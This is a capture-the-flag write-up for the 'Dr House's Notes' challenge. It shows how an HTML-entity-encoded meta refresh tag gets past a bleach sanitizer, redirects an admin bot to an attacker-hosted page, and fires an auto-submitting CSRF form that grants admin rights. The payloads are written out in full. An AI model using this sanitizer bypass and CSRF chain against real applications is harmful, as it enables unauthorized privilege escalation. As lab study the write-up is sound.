*While solving this challenge, I needed to host a web page to perform a CSRF attack and escalate my privileges to admin.
Instead of removing the repository, I decided to document the solution in a short write-up.*

### Write-up: Dr House’s Notes

CTF MetaRed Argentina TIC 2025 Quals

In this challenge, we interact with a Python-based Notes application where users can create notes containing limited HTML.
The main objective is to escalate privileges and access the admin panel to obtain the flag.

1. Application Analysis
• HTML Sanitization

The application uses bleach to sanitize user-controlled HTML:
```python
def sanitize_html(content: str) -> str:
    return bleach.clean(
        content,
        tags=['b', 'i', 'u', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'meta', 'blockquote'],
        attributes=['class', 'crossorigin', 'hidden', 'name', 'http-equiv', 'aria-hidden', 'content'],
        protocols=[],
        strip=True,
        strip_comments=True
    )

```
Important observations:

The meta tag is allowed.
Attributes such as http-equiv and content are also allowed.
No protocols are allowed (protocols=[]), so raw https:// would normally be blocked.
All JavaScript is stripped, so no classic XSS is possible.
The challenge is therefore not about injecting JavaScript, but about abusing the allowed HTML.

2. Objective

There is an endpoint that lets the admin upgrade a normal user to an admin user.
We want to trick the admin into sending that request on our behalf, using CSRF.
To achieve this, we need a way to force the admin’s browser to load our malicious external page.

3. Bypassing Sanitization via HTML Encoding

Although bleach blocks protocols such as https://, the browser will decode HTML before processing the meta refresh instruction.

For example:

https://attacker.com

Becomes:
```html
&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;
```
Bleach sees harmless text.
The browser decodes it back to a valid URL.
This gives us a working redirect even though protocols are supposedly blocked.

4. Meta Refresh Payload

We insert the following payload in a note:
```html
<meta http-equiv="refresh" content="0;url=&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x74;&#x62;&#x64;&#x31;&#x33;&#x33;&#x37;&#x2e;&#x67;&#x69;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x69;&#x6f;&#x2f;&#x44;&#x72;&#x2d;&#x48;&#x6f;&#x75;&#x73;&#x65;&#x2d;&#x73;&#x2d;&#x6e;&#x6f;&#x74;&#x65;&#x73;&#x2f;&#x0a;">
```

Once rendered, the browser decodes the entities and interprets it as a normal:
```
<meta http-equiv="refresh" content="0;url=https://tbd1337.github.io/Dr-House-s-notes/">
```

This causes an automatic redirect to our malicious external page.

5. Executing the Attack

Create a new note in the target application containing the encoded meta refresh payload.
Use the “Report to admin” feature so the admin views the note.
When the admin loads the note, their browser instantly redirects to our hosted malicious page.

Our external page contains a CSRF form that auto-submits:
```
<form action="http:localhost:5000/admin/make_admin/{urID}" method="POST" id="f" >
</form>
<script>
document.getElementById('f').submit();
</script>
```

The admin’s browser sends the POST request, including their authenticated cookies.
Our user is now upgraded to admin.
We log in and access the admin panel to retrieve the flag.

<img width="1920" height="1080" alt="Screenshot 2025-12-04 201408" src="https://github.com/user-attachments/assets/ff2db602-017b-4cb6-b14f-2c49637c76dd" />




